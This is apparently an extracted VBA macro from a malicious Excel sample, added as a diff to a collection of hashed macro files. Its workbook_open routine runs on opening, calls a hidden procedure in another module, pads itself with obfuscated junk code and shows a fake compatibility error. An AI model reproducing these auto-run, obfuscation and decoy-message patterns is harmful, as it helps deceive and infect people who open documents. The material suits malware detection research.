@@ -1,0 +1,52 @@
+Filename     : ./macros/f36b839315673e7a970a9769cb3bfcc22e562ed4d6041ed17a6a89f0ce34879b
+OLE stream   : _VBA_PROJECT_CUR/VBA/ThisWorkbook
+VBA filename : ThisWorkbook.cls
+----------------------------------------
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Private Sub workbook_open()
+
+
+fkMhbCy.quEtsJmFFFaxMGRWlQeP
+Dim iOZNgMqfrTnDYXFm As Worksheet
+If fwhSHtVhPrsvT = lWcCvIbVrNfTHOlSWYoAfrojLHosryoUuLGxLBdOeQojBzAfkPtSDvothsq Then
+Dim nTidsYLYvHoHVv As Worksheet
+Dim ZWPDFhLHJIcFVQzXMQSKpvvmvKqbFXwI As Variant
+End If
+Dim XXeZZqcLegKaBnDuYYvXpLFeacIvrkBlMThymaxWoGfJkUkHHv As Worksheet
+If CgcYTMSzywigUueZOiGEIyaYjifwtGrAowhUInAUfmbAoHmkeKGCBCnDGD = okhWFsFhsXNJQailZVXZkcvuRizozlJdOFzPnJhjvGOOXUu Then
+Dim fUPdRggSLpmEWsQiHOjvKbSxQooedOhWxoUUjIrxhmnZB As Worksheet
+Dim EKqeYHzoYjEBSNdsCoxHPHiYwzyX As Variant
+End If
+Dim mOXnswLdxzFHhiYEPSQvNEeyqSlwbRiZJcCKMQI As Worksheet
+If WBzuDjpahjdIeiCKhjZwaKOBfRgyFfNsyJuuNKbPArDNyIE = qGRVbmUhMm Then
+Dim yOlCrVCVlKUoIwWHKvjGBDWNprnJmFeciHPvpMJWBs As Worksheet
+Dim MyjCyVyTcYyFlurYNzhsjffsGAhbSxmMFIq As Variant
+End If
+
+DorSyllrKTtdkXJ = MsgBox("The version of this file is not compatible with the version of Windows you're running.", vbCritical, "Contact Administrator")
+Dim YdmtSLSdFddWVDRzJoIJhSrwxnXBemlzcDTvaGPhQBZOdd As Worksheet
+If MYAydYwzJFlqveoRz = TsdtRjWYCZbsfsdTUbzAfINCdtNJkKkszCGWzjuoeaazVGd Then
+Dim MIWbDoQTKebQXVMnsoitdmGTkhLWFiNhWQBBNihEijvrYTWSRmiKmMAa As Worksheet
+Dim BDrVduOcQutHULZJGeKuqOvQKsESADuJQbzKrLaoUTaeZP As Variant
+End If
+Dim xGMYDHCGjnHbLkqv As Worksheet
+If bNzjrtMPSuEWZXoRqvvxFbzmHKrMDPApxYrNepXDtxGIDfgLypkP = psqAOMchBALCuOZAgbnBXrEHVqjcdgNNfkzFirySNqCtlDOoGffXCjs Then
+Dim yoieXczDVnyWJPTSpcUngpLWRbvWxApLwsBQzMbpNngFngFZmNqvhvMJd As Worksheet
+Dim MNvhdFVxmaRNDScA As Variant
+End If
+Dim fZtIFilWVjkKtdAfsnnzfHkh As Worksheet
+If LHAGnLjvNuCWSAYdbZL = tVKEJZlVPedVXpLwxieiKAp Then
+Dim wyaeNrPKXGvqLADqgCpTQjZfhGDavxqBsgO As Worksheet
+Dim FjvYezUGPbyzwtrygV As Variant
+End If
+
+
+End Sub
+
